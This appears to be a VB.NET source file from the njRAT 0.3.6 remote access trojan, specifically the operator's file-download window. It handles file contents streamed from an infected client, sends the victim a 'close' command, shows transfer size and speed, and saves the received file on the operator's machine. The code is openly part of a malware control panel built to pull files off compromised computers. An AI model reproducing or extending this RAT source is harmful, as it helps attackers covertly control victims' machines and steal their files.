Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT
Imports System.Text


Public Class DW
    Public FNn As String
    Public FS As FileStream
    Public os As Integer
    Public SZ As Integer
    Public TMP As String
    Public c As Client

    Public Sub New()
        Me.os = 0
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
            Me.c.Send("close" + ind.Y + Me.FNn)
            Me.FS.Close()
            Me.FS.Dispose()
            File.Delete(Application.StartupPath + "\" + Conversions.ToString(Me.GetHashCode()))
            Me.Button1.Enabled = False
        Else
            Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
            saveFileDialog.FileName = Me.Lv1.Items(0).SubItems(0).Text
            If saveFileDialog.ShowDialog() = DialogResult.OK Then
                File.Move(Application.StartupPath + "\" + Conversions.ToString(Me.GetHashCode()), saveFileDialog.FileName)
                Me.Close()
            End If
        End If
    End Sub

    Private Sub DW_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Text = FN.DEB(Me.FNn)
        Me.Name = (Me.c.ip & Me.FNn)
        Me.Lv1.Items.Item(0).SubItems.Item(0).Text = New FileInfo(FN.DEB(Me.FNn)).Name
        Me.Lv1.Items.Item(1).SubItems.Item(0).Text = FN.siz((Me.SZ))
        Me.FS = New FileStream((Application.StartupPath & "\" & (Me.GetHashCode)), FileMode.Append)
        Me.Lv1.Items.Item(2).SubItems.Item(0).Text = FN.siz((CInt((Me.ProgressBar1.Value - Me.os))))
        Me.os = Me.ProgressBar1.Value
        Me.Lv1.Items.Item(3).SubItems.Item(0).Text = FN.siz((Me.ProgressBar1.Value))
        Me.Lv1.FX()
        Me.Timer1.Enabled = True

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            Me.Lv1.Items.Item(2).SubItems.Item(1).Text = FN.siz((CInt((Me.ProgressBar1.Value - Me.os))))
            Me.os = Me.ProgressBar1.Value
            Me.Lv1.Items.Item(3).SubItems.Item(1).Text = FN.siz((Me.ProgressBar1.Value))
        Catch exception1 As Exception
        End Try
    End Sub

End Class